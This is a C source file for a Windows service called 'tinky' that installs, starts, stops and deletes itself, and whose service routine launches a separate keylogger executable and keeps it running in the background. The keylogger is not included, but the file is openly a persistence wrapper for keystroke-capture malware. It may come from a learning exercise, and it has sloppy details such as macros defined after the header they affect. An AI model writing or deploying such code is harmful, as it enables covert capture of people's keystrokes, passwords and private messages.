#include <windows.h>
#include <stdio.h>

#define SERVICE_NAME "tinky"
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2 0x0A00
#define _WIN32_WINNT_WIN10_RS1 0x0A00
#define _WIN32_WINNT_WIN10_RS2 0x0A00
#define _WIN32_WINNT_WIN10_RS3 0x0A00
#define _WIN32_WINNT_WIN10_RS4 0x0A00
#define _WIN32_WINNT_WIN10_RS5 0x0A00
#define NTDDI_WIN10_CU 0x0A000000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE hKeyloggerProcess = NULL;

int InstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }
    SC_HANDLE hService = CreateService(
        hSCManager, SERVICE_NAME, SERVICE_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe start",
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService)
    {
        printf("CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    printf("Service installed successfully.\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int UninstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }
    
    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, DELETE);
    if (!hService)
    {
        printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    if (DeleteService(hService))
    {
        printf("Service deleted successfully.\n");
    }
    else
    {
        printf("DeleteService failed: %lu\n", GetLastError());
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

void StopKeylogger(void)
{
    if (hKeyloggerProcess)
    {
        TerminateProcess(hKeyloggerProcess, 0);
        CloseHandle(hKeyloggerProcess);
        hKeyloggerProcess = NULL;
    }
}

void WINAPI ControlHandler(DWORD request)
{
    switch (request)
    {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            StopKeylogger();
            return;
        default:
            break;
    }
    SetServiceStatus(hStatus, &ServiceStatus);
}

void StartKeylogger(void)
{
    /*copilot tab review*/
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    if (CreateProcess("C:\\path\\to\\keyloger.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        hKeyloggerProcess = pi.hProcess;
        CloseHandle(pi.hThread);
    }
    else
    {
        printf("Failed to start keylogger: %lu\n", GetLastError());
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    (void)argc;
    (void)argv;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
    if (!hStatus) return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(hStatus, &ServiceStatus);

    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    StartKeylogger();

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(1000);
    }
}

int main(int argc, char* argv[])
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "install") == 0)
        {
            return InstallService();
        }
        else if (strcmp(argv[1], "delete") == 0)
        {
            return UninstallService();
        }
        else if (strcmp(argv[1], "start") == 0)
        {
            SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
            StartServiceCtrlDispatcher(ServiceTable);
        }
        else if (strcmp(argv[1], "stop") == 0)
        {
            SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP);
            if (hService)
            {
                ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
    else
    {
        printf("Usage: svc.exe [install | start | stop | delete]\n");
    }
    return 0;
}
